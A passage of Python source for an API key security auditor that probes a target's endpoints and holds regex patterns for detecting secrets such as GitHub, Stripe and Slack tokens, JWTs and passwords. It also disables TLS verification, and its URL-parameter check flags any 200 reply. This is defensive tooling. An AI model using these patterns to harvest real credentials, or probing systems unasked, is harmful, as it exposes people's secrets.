    "Generic API Key":       r"(?i)api[_-]?key['\"\s:=]+([a-zA-Z0-9_\-]{20,50})",
    "Bearer Token":          r"[Bb]earer\s+([a-zA-Z0-9._\-]{20,})",
    "GitHub Token":          r"gh[pousr]_[A-Za-z0-9]{36}",
    "Stripe Key":            r"(?:sk|pk)_(?:live|test)_[a-zA-Z0-9]{24}",
    "SendGrid Key":          r"SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}",
    "Slack Token":           r"xox[baprs]-[a-zA-Z0-9]{10,}",
    "JWT":                   r"eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+",
    "Google API Key":        r"AIza[0-9A-Za-z\-_]{35}",
    "Generic Secret":        r"(?i)(?:secret|password|passwd|pwd)['\"\s:=]+([^'\"\s,]{8,50})",
}

# URL patterns that suggest API key in URL (bad practice)
API_KEY_IN_URL_PATTERNS = [
    r"[?&]api[_-]?key=([^&\s]+)",
    r"[?&]token=([^&\s]+)",
    r"[?&]access[_-]?token=([^&\s]+)",
    r"[?&]secret=([^&\s]+)",
    r"[?&]key=([a-zA-Z0-9_\-]{20,})",
]


def _key_entropy(key: str) -> float:
    """Calculate Shannon entropy of a string."""
    if not key:
        return 0.0
    from math import log2
    freq = {}
    for c in key:
        freq[c] = freq.get(c, 0) + 1
    return -sum(f/len(key) * log2(f/len(key)) for f in freq.values())


class APIKeyAuditor:
    """
    Audit API key security practices.

    Checks:
    1. API key exposed in response body / headers
    2. API key in URL (logged by proxies/servers)
    3. Low entropy API keys (guessable)
    4. API key in error messages
    5. API key rotation — check if old key still works after rotation
    6. API key scope validation (key accepts requests beyond its scope)
    """

    def __init__(
        self,
        target: str,
        api_key: str | None = None,
        output_dir: str = "./findings/auth",
        timeout: int = 10,
    ):
        self.target     = target.rstrip("/")
        self.api_key    = api_key
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timeout    = timeout

        self.headers = {"User-Agent": "Glitchicons/1.8.0"}
        if api_key:
            self.headers["X-API-Key"] = api_key

        self.client = httpx.Client(
            timeout=timeout, headers=self.headers,
            follow_redirects=True, verify=False,
        )

    def run(self, endpoints: list[str] | None = None) -> list[dict]:
        """Run all API key audit checks."""
        console.print(f"\n  [bold cyan]API Key Auditor[/bold cyan] → {self.target}")
        findings = []

        test_endpoints = endpoints or [
            "/api/user", "/api/users/me", "/api/config",
            "/api/health", "/api/v1/user",
        ]

        for ep in test_endpoints:
            url = self.target + ep
            findings.extend(self._check_key_in_response(url))
            findings.extend(self._check_key_in_url(url))

        if self.api_key:
            findings.extend(self._check_key_entropy(self.api_key))
            findings.extend(self._check_key_scope(test_endpoints))

        self._save(findings)
        console.print(f"  API Key findings: [bold]{len(findings)}[/bold]")
        return findings

    def _check_key_in_response(self, url: str) -> list[dict]:
        """Scan response body for exposed API keys or secrets."""
        findings = []
        try:
            resp = self.client.get(url)
        except Exception:
            return findings

        for key_type, pattern in API_KEY_PATTERNS.items():
            matches = re.findall(pattern, resp.text)
            if matches:
                # Filter out very short or obvious non-secrets
                real_matches = [m for m in matches if len(m) >= 12]
                if real_matches:
                    findings.append(_finding(
                        title=f"API Key / Secret Exposed in Response: {key_type}",
                        severity="CRITICAL",
                        cvss=9.1,
                        cwe="CWE-312",
                        description=(
                            f"Response from {url} contains what appears to be a {key_type}. "
                            "Exposed credentials can be immediately exploited by attackers."
                        ),
                        evidence=(
                            f"URL: {url}\nHTTP {resp.status_code}\n"
                            f"Pattern: {key_type}\n"
                            f"Match (truncated): {real_matches[0][:20]}..."
                        ),
                        remediation=(
                            f"Remove {key_type} from API responses immediately. "
                            "Never return credentials in API responses. "
                            "Rotate the exposed key immediately. "
                            "Audit logs for unauthorized usage."
                        ),
                        target=url,
                        source="api_key_auditor",
                    ))
                    break
        return findings

    def _check_key_in_url(self, url: str) -> list[dict]:
        """Check if API key appears in URL parameters."""
        findings = []
        # Test if endpoint accepts API key as URL param
        test_params = ["api_key", "token", "access_token", "key", "secret"]
        dummy_key = "test_" + secrets.token_hex(12)

        for param in test_params:
            test_url = f"{url}?{param}={dummy_key}"
            try:
                resp = self.client.get(test_url)
                if resp.status_code == 200 and dummy_key not in resp.headers.get("x-secret", ""):
                    # If 200 without proper auth, the endpoint might accept key in URL
                    # (We can't confirm without a real key, so flag the pattern)
                    if resp.status_code == 200:
                        findings.append(_finding(
                            title=f"API Key Accepted in URL Parameter: ?{param}=",
                            severity="MEDIUM",
                            cvss=5.9,
                            cwe="CWE-598",
                            description=(
                                f"Endpoint accepts authentication via URL parameter ?{param}=. "
                                "API keys in URLs are logged by web servers, proxies, and browser history. "
                                "This exposes credentials to log aggregation systems."
                            ),
                            evidence=(
                                f"URL: {test_url[:100]}\n"
                                f"HTTP {resp.status_code} — key in URL accepted"
                            ),
                            remediation=(
                                "Accept API keys only via Authorization header or request body. "
                                "Never accept credentials as URL query parameters. "
                                "Rotate any keys that may have been logged."
                            ),
                            target=url,
                            source="api_key_auditor",
                        ))
                        return findings
            except Exception:
                continue
        return findings

    def _check_key_entropy(self, key: str) -> list[dict]:
        """Check if API key has sufficient entropy."""
        findings = []
        entropy = _key_entropy(key)
        key_len = len(key)

        if key_len < 20:
            findings.append(_finding(
                title=f"API Key Too Short — {key_len} Characters",
                severity="MEDIUM",
                cvss=5.3,
                cwe="CWE-521",
                description=(
                    f"API key length is only {key_len} characters. "
                    "Short keys are vulnerable to brute force attacks."
                ),
                evidence=f"Key length: {key_len} (recommend: ≥ 32)\nEntropy: {entropy:.2f} bits/char",
                remediation=(
                    "Use minimum 32-character API keys. "
                    "Generate keys with cryptographically secure random source (secrets.token_urlsafe(32))."
                ),
                target=self.target,
                source="api_key_auditor",
            ))
        elif entropy < 3.5:
            findings.append(_finding(
                title=f"API Key Low Entropy — {entropy:.2f} bits/char",
                severity="LOW",
                cvss=3.7,
                cwe="CWE-521",
                description=(
                    f"API key has low entropy ({entropy:.2f} bits/char). "
                    "Low-entropy keys may be guessable or follow a predictable pattern."
                ),
                evidence=f"Key length: {key_len}\nEntropy: {entropy:.2f} bits/char (recommend: ≥ 4.0)",
                remediation=(
                    "Generate API keys using cryptographically secure random source. "
                    "Target entropy: ≥ 4.0 bits/char (full alphanumeric charset). "
                    "Use secrets.token_urlsafe() or /dev/urandom."
                ),
                target=self.target,
                source="api_key_auditor",
            ))
        return findings

    def _check_key_scope(self, endpoints: list[str]) -> list[dict]:
        """Test if API key has overly broad scope."""
        findings = []
        admin_endpoints = [ep for ep in endpoints if "admin" in ep or "config" in ep]

        for ep in admin_endpoints:
            url = self.target + ep
            try:
                resp = self.client.get(url)
                if resp.status_code == 200:
                    findings.append(_finding(
                        title=f"API Key Overly Broad Scope — Admin Endpoint Accessible",
                        severity="HIGH",
                        cvss=7.5,
                        cwe="CWE-732",
                        description=(
                            f"API key has access to administrative endpoint {ep}. "
                            "API keys should follow principle of least privilege."
                        ),
                        evidence=f"Endpoint: {url}\nHTTP {resp.status_code} — admin access granted",
                        remediation=(
                            "Implement API key scopes. "
                            "Issue separate keys per service with minimal required permissions. "
                            "Use OAuth 2.0 scopes instead of single API keys for fine-grained access."
                        ),
                        target=url,
                        source="api_key_auditor",
                    ))
                    break
            except Exception:
                continue
        return findings

    def detect_keys_in_text(self, text: str) -> dict[str, list[str]]:
        """Scan arbitrary text for API key patterns. Useful for log/code scanning."""
        results = {}
        for key_type, pattern in API_KEY_PATTERNS.items():
            matches = re.findall(pattern, text)
            if matches:
                results[key_type] = [m[:40] for m in matches[:5]]
        return results

    def _save(self, findings: list[dict]) -> Path:
        slug = self.target.replace("/", "_").replace(":", "").replace(".", "_")
        out  = self.output_dir / f"apikey_{slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        out.write_text(json.dumps({"target": self.target, "findings": findings}, indent=2),
                       encoding="utf-8")
        return out
